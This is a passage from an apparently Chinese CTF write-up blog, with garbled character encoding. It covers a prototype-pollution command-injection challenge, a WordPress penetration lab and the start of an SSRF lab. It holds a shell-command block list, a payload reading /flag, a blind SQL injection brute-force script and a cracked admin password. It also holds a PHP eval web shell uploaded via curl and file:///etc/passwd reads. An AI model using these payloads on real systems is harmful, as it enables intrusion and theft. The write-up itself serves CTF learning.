class="string">&quot;less&quot;</span>, <span class="string">&quot;gpgsplit&quot;</span>, <span class="string">&quot;pgrep&quot;</span>, <span class="string">&quot;truncate&quot;</span>, <span class="string">&quot;localedef&quot;</span>, <span class="string">&quot;printf&quot;</span>, <span class="string">&quot;gencat&quot;</span>, <span class="string">&quot;sed&quot;</span>, <span class="string">&quot;ptx&quot;</span>, <span class="string">&quot;nm&quot;</span>, <span class="string">&quot;pwmake&quot;</span>, <span class="string">&quot;zmore&quot;</span>, <span class="string">&quot;tzselect&quot;</span>, <span class="string">&quot;script&quot;</span>, <span class="string">&quot;dnsdomainname&quot;</span>, <span class="string">&quot;ar&quot;</span>, <span class="string">&quot;more&quot;</span>, <span class="string">&quot;journalctl&quot;</span>, <span class="string">&quot;gunzip&quot;</span>, <span class="string">&quot;makedb&quot;</span>, <span class="string">&quot;tac&quot;</span>, <span class="string">&quot;col&quot;</span>, <span class="string">&quot;sync&quot;</span>, <span class="string">&quot;vi&quot;</span>, <span class="string">&quot;locale&quot;</span>, <span class="string">&quot;prlimit&quot;</span>, <span class="string">&quot;nisdomainname&quot;</span>, <span class="string">&quot;timedatectl&quot;</span>, <span class="string">&quot;ipcmk&quot;</span>, <span class="string">&quot;isosize&quot;</span>, <span class="string">&quot;free&quot;</span>, <span class="string">&quot;alias&quot;</span>, <span class="string">&quot;taskset&quot;</span>, <span class="string">&quot;factor&quot;</span>, <span class="string">&quot;pinky&quot;</span>, <span class="string">&quot;arch&quot;</span>, <span class="string">&quot;lscpu&quot;</span>, <span class="string">&quot;awk&quot;</span>, <span class="string">&quot;tty&quot;</span>, <span class="string">&quot;xmllint&quot;</span>, <span class="string">&quot;xzcmp&quot;</span>, <span class="string">&quot;readelf&quot;</span>, <span class="string">&quot;kdumpctl&quot;</span>, <span class="string">&quot;tsort&quot;</span>, <span class="string">&quot;nice&quot;</span>, <span class="string">&quot;cal&quot;</span>, <span class="string">&quot;rpmdb&quot;</span>, <span class="string">&quot;newgrp&quot;</span>, <span class="string">&quot;xmlwf&quot;</span>, <span class="string">&quot;slabtop&quot;</span>, <span class="string">&quot;utmpdump&quot;</span>, <span class="string">&quot;tar&quot;</span>, <span class="string">&quot;basename&quot;</span>, <span class="string">&quot;eject&quot;</span>, <span class="string">&quot;ranlib&quot;</span>, <span class="string">&quot;wall&quot;</span>, <span class="string">&quot;zless&quot;</span>, <span class="string">&quot;sort&quot;</span>, <span class="string">&quot;nsenter&quot;</span>, <span class="string">&quot;getent&quot;</span>, <span class="string">&quot;chrt&quot;</span>, <span class="string">&quot;mount&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;systemctl&quot;</span>, <span class="string">&quot;vmstat&quot;</span>, <span class="string">&quot;xmlcatalog&quot;</span>, <span class="string">&quot;date&quot;</span>, <span class="string">&quot;lsinitrd&quot;</span>, <span class="string">&quot;tload&quot;</span>, <span class="string">&quot;chmod&quot;</span>, <span class="string">&quot;setsid&quot;</span>, <span class="string">&quot;getopts&quot;</span>, <span class="string">&quot;colcrt&quot;</span>, <span class="string">&quot;su&quot;</span>, <span class="string">&quot;lsipc&quot;</span>, <span class="string">&quot;login&quot;</span>, <span class="string">&quot;lsns&quot;</span>, <span class="string">&quot;unalias&quot;</span>, <span class="string">&quot;lastb&quot;</span>, <span class="string">&quot;df&quot;</span>, <span class="string">&quot;gpg&quot;</span>, <span class="string">&quot;type&quot;</span>, <span class="string">&quot;gpgv&quot;</span>, <span class="string">&quot;pathchk&quot;</span>, <span class="string">&quot;groups&quot;</span>, <span class="string">&quot;lsmem&quot;</span>, <span class="string">&quot;users&quot;</span>, <span class="string">&quot;as&quot;</span>, <span class="string">&quot;ipcs&quot;</span>, <span class="string">&quot;jobs&quot;</span>, <span class="string">&quot;command&quot;</span>, <span class="string">&quot;iconv&quot;</span>, <span class="string">&quot;dwp&quot;</span>, <span class="string">&quot;domainname&quot;</span>, <span class="string">&quot;xzcat&quot;</span>, <span class="string">&quot;ldd&quot;</span>, <span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;strip&quot;</span>, <span class="string">&quot;dircolors&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;trust&quot;</span>, <span class="string">&quot;stty&quot;</span>, <span class="string">&quot;ul&quot;</span>, <span class="string">&quot;chacl&quot;</span>, <span class="string">&quot;loginctl&quot;</span>, <span class="string">&quot;gzip&quot;</span>, <span class="string">&quot;xzmore&quot;</span>, <span class="string">&quot;zcat&quot;</span>, <span class="string">&quot;busctl&quot;</span>, <span class="string">&quot;fincore&quot;</span>, <span class="string">&quot;fgrep&quot;</span>, <span class="string">&quot;dmesg&quot;</span>, <span class="string">&quot;rm&quot;</span>, <span class="string">&quot;mv&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;lslogins&quot;</span>, <span class="string">&quot;numfmt&quot;</span>, <span class="string">&quot;flock&quot;</span>, <span class="string">&quot;realpath&quot;</span>, <span class="string">&quot;find&quot;</span>, <span class="string">&quot;tracepath&quot;</span>, <span class="string">&quot;lesskey&quot;</span>, <span class="string">&quot;printenv&quot;</span>, <span class="string">&quot;du&quot;</span>, <span class="string">&quot;grep&quot;</span>, <span class="string">&quot;udevadm&quot;</span>, <span class="string">&quot;tee&quot;</span>, <span class="string">&quot;rename&quot;</span>, <span class="string">&quot;gawk&quot;</span>, <span class="string">&quot;mkdir&quot;</span>, <span class="string">&quot;sg&quot;</span>, <span class="string">&quot;xzegrep&quot;</span>, <span class="string">&quot;xzdec&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;whereis&quot;</span>, <span class="string">&quot;strings&quot;</span>, <span class="string">&quot;setfacl&quot;</span>, <span class="string">&quot;mkfifo&quot;</span>, <span class="string">&quot;chage&quot;</span>, <span class="string">&quot;xzgrep&quot;</span>, <span class="string">&quot;kill&quot;</span>, <span class="string">&quot;rvi&quot;</span>, <span class="string">&quot;size&quot;</span>, <span class="string">&quot;ypdomainname&quot;</span>, <span class="string">&quot;tr&quot;</span>, <span class="string">&quot;umount&quot;</span>, <span class="string">&quot;rev&quot;</span>, <span class="string">&quot;wdctl&quot;</span>, <span class="string">&quot;uniq&quot;</span>, <span class="string">&quot;ps&quot;</span>, <span class="string">&quot;stdbuf&quot;</span>, <span class="string">&quot;chgrp&quot;</span>, <span class="string">&quot;setarch&quot;</span>, <span class="string">&quot;cd&quot;</span>, <span class="string">&quot;dirmngr&quot;</span>, <span class="string">&quot;write&quot;</span>, <span class="string">&quot;lastlog&quot;</span>, <span class="string">&quot;gsettings&quot;</span>, <span class="string">&quot;ex&quot;</span>, <span class="string">&quot;ipcrm&quot;</span>, <span class="string">&quot;cp&quot;</span>, <span class="string">&quot;fallocate&quot;</span>, <span class="string">&quot;colrm&quot;</span>, <span class="string">&quot;rpm&quot;</span>, <span class="string">&quot;pwdx&quot;</span>, <span class="string">&quot;xargs&quot;</span>, <span class="string">&quot;objdump&quot;</span>, <span class="string">&quot;ld&quot;</span>, <span class="string">&quot;chcon&quot;</span>, <span class="string">&quot;skill&quot;</span>, <span class="string">&quot;yum&quot;</span>, <span class="string">&quot;who&quot;</span>, <span class="string">&quot;gapplication&quot;</span>, <span class="string">&quot;stat&quot;</span>, <span class="string">&quot;sleep&quot;</span>, <span class="string">&quot;wait&quot;</span>, <span class="string">&quot;fg&quot;</span>, <span class="string">&quot;uuidgen&quot;</span>, <span class="string">&quot;logger&quot;</span>, <span class="string">&quot;pwscore&quot;</span>, <span class="string">&quot;xz&quot;</span>, <span class="string">&quot;mesg&quot;</span>, <span class="string">&quot;rmdir&quot;</span>, <span class="string">&quot;zgrep&quot;</span>, <span class="string">&quot;chmem&quot;</span>, <span class="string">&quot;newuidmap&quot;</span>, <span class="string">&quot;evmctl&quot;</span>, <span class="string">&quot;wc&quot;</span>, <span class="string">&quot;top&quot;</span>, <span class="string">&quot;egrep&quot;</span>, <span class="string">&quot;fold&quot;</span>, <span class="string">&quot;zfgrep&quot;</span>, <span class="string">&quot;link&quot;</span>, <span class="string">&quot;csplit&quot;</span>, <span class="string">&quot;sum&quot;</span>, <span class="string">&quot;expand&quot;</span>, <span class="string">&quot;getfacl&quot;</span>, <span class="string">&quot;newgidmap&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;install&quot;</span>, <span class="string">&quot;bootctl&quot;</span>, <span class="string">&quot;xzless&quot;</span>, <span class="string">&quot;runcon&quot;</span>, <span class="string">&quot;dirname&quot;</span>, <span class="string">&quot;comm&quot;</span>, <span class="string">&quot;false&quot;</span>, <span class="string">&quot;hostname&quot;</span>, <span class="string">&quot;unlink&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;ipcalc&quot;</span>, <span class="string">&quot;unexpand&quot;</span>, <span class="string">&quot;nohup&quot;</span>, <span class="string">&quot;zegrep&quot;</span>, <span class="string">&quot;head&quot;</span>, <span class="string">&quot;getopt&quot;</span>, <span class="string">&quot;raw&quot;</span>, <span class="string">&quot;hexdump&quot;</span>, <span class="string">&quot;mountpoint&quot;</span>, <span class="string">&quot;lslocks&quot;</span>, <span class="string">&quot;coreutils&quot;</span>, <span class="string">&quot;shred&quot;</span>, <span class="string">&quot;sotruss&quot;</span>, <span class="string">&quot;true&quot;</span>, <span class="string">&quot;pldd&quot;</span>, <span class="string">&quot;uuidparse&quot;</span>, <span class="string">&quot;localectl&quot;</span>, <span class="string">&quot;gtar&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;znew&quot;</span>, <span class="string">&quot;logname&quot;</span>, <span class="string">&quot;gzexe&quot;</span>, <span class="string">&quot;rpmquery&quot;</span>, <span class="string">&quot;touch&quot;</span>, <span class="string">&quot;hash&quot;</span>, <span class="string">&quot;cpio&quot;</span>, <span class="string">&quot;sprof&quot;</span>, <span class="string">&quot;hostnamectl&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;uname&quot;</span>, <span class="string">&quot;unxz&quot;</span>, <span class="string">&quot;zdiff&quot;</span>, <span class="string">&quot;gdbus&quot;</span>, <span class="string">&quot;namei&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;kmod&quot;</span>, <span class="string">&quot;info&quot;</span>, <span class="string">&quot;umask&quot;</span>, <span class="string">&quot;zcmp&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;mktemp&quot;</span>, <span class="string">&quot;pwd&quot;</span>, <span class="string">&quot;column&quot;</span>, <span class="string">&quot;scriptreplay&quot;</span>, <span class="string">&quot;lessecho&quot;</span>, <span class="string">&quot;look&quot;</span>, <span class="string">&quot;setterm&quot;</span>, <span class="string">&quot;gdbmtool&quot;</span>, <span class="string">&quot;rpmkeys&quot;</span>, <span class="string">&quot;bg&quot;</span>, <span class="string">&quot;id&quot;</span>, <span class="string">&quot;gpasswd&quot;</span>, <span class="string">&quot;dracut&quot;</span>, <span class="string">&quot;vdir&quot;</span>, <span class="string">&quot;mcookie&quot;</span>, <span class="string">&quot;elfedit&quot;</span>, <span class="string">&quot;chown&quot;</span>, <span class="string">&quot;objcopy&quot;</span>, <span class="string">&quot;hostid&quot;</span>, <span class="string">&quot;shuf&quot;</span>, <span class="string">&quot;view&quot;</span>, <span class="string">&quot;mknod&quot;</span>, <span class="string">&quot;gpgparsemail&quot;</span>, <span class="string">&quot;fc&quot;</span>, <span class="string">&quot;tail&quot;</span>, <span class="string">&quot;zforce&quot;</span>, <span class="string">&quot;last&quot;</span>, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;ionice&quot;</span>, <span class="string">&quot;read&quot;</span>, <span class="string">&quot;resolvectl&quot;</span>, <span class="string">&quot;watchgnupg&quot;</span>, <span class="string">&quot;unshare&quot;</span>, <span class="string">&quot;timeout&quot;</span>, <span class="string">&quot;getconf&quot;</span>, <span class="string">&quot;findmnt&quot;</span>, <span class="string">&quot;pr&quot;</span>, <span class="string">&quot;xzfgrep&quot;</span>, <span class="string">&quot;ping&quot;</span>, <span class="string">&quot;rview&quot;</span>, <span class="string">&quot;fmt&quot;</span>, <span class="string">&quot;echo&quot;</span>, <span class="string">&quot;readlink&quot;</span>, <span class="string">&quot;dd&quot;</span>, <span class="string">&quot;paste&quot;</span>, <span class="string">&quot;od&quot;</span>, <span class="string">&quot;setpriv&quot;</span>, <span class="string">&quot;coredumpctl&quot;</span>, <span class="string">&quot;dnf&quot;</span>, <span class="string">&quot;xzdiff&quot;</span>, <span class="string">&quot;renice&quot;</span>, <span class="string">&quot;pkill&quot;</span>, <span class="string">&quot;mkinitrd&quot;</span>, <span class="string">&quot;pmap&quot;</span>, <span class="string">&quot;snice&quot;</span>, <span class="string">&quot;gio&quot;</span>, <span class="string">&quot;gpgconf&quot;</span>, <span class="string">&quot;expr&quot;</span>, <span class="string">&quot;ulimit&quot;</span>, <span class="string">&quot;nproc&quot;</span>, <span class="string">&quot;pidof&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;cksum&quot;</span>, <span class="string">&quot;yes&quot;</span>, <span class="string">&quot;rpmverify&quot;</span>, <span class="string">&quot;lsblk&quot;</span>, <span class="string">&quot;catchsegv&quot;</span>, <span class="string">&quot;uptime&quot;</span>, <span class="string">&quot;seq&quot;</span>, <span class="string">&quot;ln&quot;</span>, <span class="string">&quot;cut&quot;</span>, <span class="string">&quot;bashbug&quot;</span>, <span class="string">&quot;curl&quot;</span>, <span class="string">&quot;gprof&quot;</span>, <span class="string">&quot;node&quot;</span>, <span class="string">&quot;npm&quot;</span>, <span class="string">&quot;corepack&quot;</span>, <span class="string">&quot;npx&quot;</span>];</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">eval_chr</span> = [<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&gt;&quot;</span>];</span><br><span class="line">    <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; command.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cmd.<span class="title function_ invoke__">includes</span>(command[i] + <span class="string">&#x27;&amp;&#x27;</span>) || cmd.<span class="title function_ invoke__">includes</span>(<span class="string">&#x27;&amp;&#x27;</span> + command[i]) || cmd.<span class="title function_ invoke__">includes</span>(command[i] + <span class="string">&#x27;|&#x27;</span>) || cmd.<span class="title function_ invoke__">includes</span>(<span class="string">&#x27;|&#x27;</span> + command[i]) || cmd.<span class="title function_ invoke__">includes</span>(<span class="string">&#x27;;&#x27;</span> + command[i]) || cmd.<span class="title function_ invoke__">includes</span>(<span class="string">&#x27;(&#x27;</span> + command[i]) || cmd.<span class="title function_ invoke__">includes</span>(<span class="string">&#x27;/&#x27;</span> + command[i])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (let j = <span class="number">0</span>; j &lt; eval_chr.length; j++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cmd.<span class="title function_ invoke__">includes</span>(eval_chr[j])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>check_cmdä¸­ä¸å…è®¸ä½¿ç”¨å¸¦å‚æ•°çš„å‘½ä»¤</p><p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">æˆ‘æ˜¯å¦‚ä½•åˆ©ç”¨ç¯å¢ƒå˜é‡æ³¨å…¥æ‰§è¡Œä»»æ„å‘½ä»¤ | ç¦»åˆ«æ­Œ (leavesongs.com)</a></p><p>paylaodï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bc645e8b-eeea-4bbe-ae7a-861bd0429a00.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;msg&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;%ff&quot;</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;cmd_rce&quot;</span>: <span class="string">&quot;env $&#x27;cat&#x27; /flag&quot;</span>&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">response = requests.<span class="title function_">post</span>(url, json=payload)</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(response.<span class="property">text</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-2023/js.png" alt=""></p><h2 id="EzPenetration"><a href="#EzPenetration" class="headerlink" title="EzPenetration"></a>EzPenetration</h2><p>ä¸€ä¸ªWordpressçš„ç«™ç‚¹ï¼Œåˆ©ç”¨wpscanå·¥å…·æ‰«æä¸€ä¸‹<strong>ï¼ˆæœ‰tokenå’Œæ²¡tokençš„å·®è·çœŸçš„å¾ˆå¤§ï¼ï¼‰</strong>ï¼š<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://10.10.10.10/wordpress -e --api-token xxxxxxxxxxxxxxxxxxx <span class="comment">#-eç®€å•è¿›è¡Œæ•´ä½“å¿«é€Ÿæ‰«æ</span></span><br></pre></td></tr></table></figure></p><p><img src="/img/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-2023/wp.png" alt=""></p><p><img src="/img/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-2023/wp2.png" alt=""></p><p>å‘ç° <strong>Registrations for the Events Calendar &lt; 2.7.6 - Unauthenticated SQL Injection</strong> çš„æ¼æ´ä»¥åŠyanshuç”¨æˆ·</p><p>åˆ©ç”¨äºŒåˆ†æ³•çˆ†ç ´è„šæœ¬è¿›è¡Œæ•°æ®åº“çˆ†ç ´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /bin/python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">        session = requests.Session()</span><br><span class="line"></span><br><span class="line">        paramsGet = &#123;<span class="string">&quot;action&quot;</span>:<span class="string">&quot;rtec_send_unregister_link&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;wp_option&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).listdir(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;touch wp_option&#x27;</span>) <span class="comment"># ç”¨äºè®°å½•wp_optionsè¡¨çš„å†…å®¹</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;wp_option&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f: <span class="comment"># æ–­ç‚¹é‡è¿</span></span><br><span class="line">                result = f.read()[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line">        i = <span class="built_in">len</span>(result)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                i = i + <span class="number">1</span></span><br><span class="line">                head = <span class="number">30</span></span><br><span class="line">                tail = <span class="number">130</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">                        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">                        paramsPost = &#123;<span class="string">&quot;email&quot;</span>:<span class="string">&quot;r3tr0young@gmail.com&quot;</span>,<span class="string">&quot;event_id&quot;</span>:<span class="string">f&quot;3 union select 1,2,3,4,5,6,7,8,9,database() from wp_users where 0^(select(select ascii(substr(group_concat(option_name,0x7e,option_value),<span class="subst">&#123;i&#125;</span>,1)) from wp_options where option_id = 16)&gt;<span class="subst">&#123;mid&#125;</span>)-- &quot;</span>&#125;</span><br><span class="line">                        cookies = &#123;<span class="string">&quot;wordpress_test_cookie&quot;</span>:<span class="string">&quot;WP%20Cookie%20check&quot;</span>&#125;</span><br><span class="line">                        response = session.post(<span class="string">&quot;http://127.0.0.1:8080/wp-admin/admin-ajax.php&quot;</span>, data=paramsPost, params=paramsGet, cookies=cookies)</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                                head = mid + <span class="number">1</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                                tail = mid</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> head != <span class="number">30</span>:</span><br><span class="line">                        result += <span class="built_in">chr</span>(head)</span><br><span class="line">                        <span class="built_in">print</span>(result)</span><br><span class="line">                        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;wp_option&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                                f.write(result)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restart</span>():</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">                main()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">                restart()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                        main()</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                        restart()</span><br></pre></td></tr></table></figure><p><img src="/img/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-2023/wp1.png" alt=""></p><p>åˆ©ç”¨è„šæœ¬çˆ†ç ´å¯†ç ç»“åˆwpscanæ‰«æå‡ºæ¥çš„ç”¨æˆ·ç™»å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yanshu </span><br><span class="line">fO0CO2#0ky#oLgH1JI</span><br></pre></td></tr></table></figure><p>ç™»å½•ç®¡ç†å‘˜è´¦å·åˆ°åå°ï¼Œæ›´æ”¹æ’ä»¶çš„phpä»£ç æˆ–è€…å®‰è£…ä¸€ä¸ªå…·æœ‰æ¼æ´çš„æ’ä»¶ï¼Œå¦‚wp-file-managerï¼Œè¿›è¡Œrce</p><p>å®‰è£…å®Œæˆåè®¿é—®<code>/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php</code></p><p><img src="/img/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-2023/wp3.png" alt=""></p><p>å‡ºç°æ­¤ç•Œé¢è¯´æ˜æ¼æ´å­˜åœ¨</p><p>å‡†å¤‡å¥½ä¸€å¥è¯æœ¨é©¬<code>shell.php</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨curlå‘½ä»¤ä¸Šä¼ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -F cmd=upload -F target=l1_ -F upload[]=@shell.php -XPOST <span class="string">&quot;http://node4.buuoj.cn:29777/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/img/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-2023/wp4.png" alt=""></p><p>èšå‰‘è¿æ¥:<br><img src="/img/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-2023/wp5.png" alt=""></p><p>åœ¨æ ¹ç›®å½•æ‰¾åˆ°flagï¼š</p><p><img src="/img/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-2023/wp6.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> DASCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å›½å…‰ssrf</title>
      <link href="/2023/11/07/%E5%9B%BD%E5%85%89ssrf/"/>
      <url>/2023/11/07/%E5%9B%BD%E5%85%89ssrf/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="xxx-xxx-xxx-xxx-8080"><a href="#xxx-xxx-xxx-xxx-8080" class="headerlink" title="xxx.xxx.xxx.xxx:8080"></a>xxx.xxx.xxx.xxx:8080</h1><p>è®¿é—®ç½‘ç«™ï¼š</p><p><img src="/img/%E5%9B%BD%E5%85%89ssrf/ssrf1.png" alt=""></p><p>å‘ç°å¯ä»¥æŸ¥è¯¢å…¶ä»–ç½‘ç«™ï¼Œå°è¯•è¯·æ±‚è‡ªå·±ï¼š</p><p><img src="/img/%E5%9B%BD%E5%85%89ssrf/ssrf2.png" alt=""></p><p>å†å°è¯•è¯·æ±‚ä¸€ä¸‹ç½‘ç«™ä¸‹çš„æ–‡ä»¶ï¼š<br><img src="/img/%E5%9B%BD%E5%85%89ssrf/ssrf3.png" alt=""></p><h1 id="172-72-23-21-ssrf"><a href="#172-72-23-21-ssrf" class="headerlink" title="172.72.23.21-ssrf"></a>172.72.23.21-ssrf</h1><p>å°è¯•ä¼ªåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">///etc/passwd</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E5%9B%BD%E5%85%89ssrf/ssrf4.png" alt=""></p><p>æŸ¥çœ‹ä¸»æœºä¿¡æ¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">///etc/hosts</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E5%9B%BD%E5%85%89ssrf/ssrf5.png" alt=""></p><p>å‘ç°å­˜åœ¨å†…ç½‘ipï¼š<code>172.72.23.21</code></p><p>å…¶ä»–æ•æ„Ÿæ–‡ä»¶ï¼ˆ<code>/proc/net/fib_trie</code>ï¼Œ<code>/proc/net/arp</code>ï¼‰è¯»å–å¤±è´¥ï¼Œå°è¯•çˆ†ç ´ä¸€ä¸‹ipçš„Cæ®µä»¥åŠç«¯å£</p><p><img src="/img/%E5%9B%BD%E5%85%89ssrf/ssrf6.png" alt=""></p><p><img src="/img/%E5%9B%BD%E5%85%89ssrf/ssrf7.png" alt=""></p><p><img src="/img/%E5%9B%BD%E5%85%89ssrf/ssrf8.png" alt=""></p><p><img src="/img/%E5%9B%BD%E5%85%89ssrf/ssrf9.png" alt=""></p><p>æ ¹æ®ç»“æœï¼Œæˆ‘ä»¬å¯ä»¥æ•´ç†å‡ºå†…ç½‘ipåŠç«¯å£çš„å¼€æ”¾æƒ…å†µï¼š<br>| ip           | port |<br>| â€”â€”â€”â€”â€”â€” | â€”â€” |<br>| 172.72.23.21 | 80   |<br>| 172.72.23.22 | 80   |<br>| 172.72.23.23 | 80   |<br>| 172.72.23.24 | 80   |<br>| 172.72.23.26 | 8080 |<br>| 172.72.23.27 | 6379 |</p><h1 id="172-72-23-22-CodeExec"><a href="#172-72-23-22-CodeExec" class="headerlink" title="172.72.23.22-CodeExec"></a>172.72.23.22-CodeExec</h1><p>åˆ©ç”¨burpç»“åˆå­—å…¸æ‰«ç›®å½•ï¼š<br><img 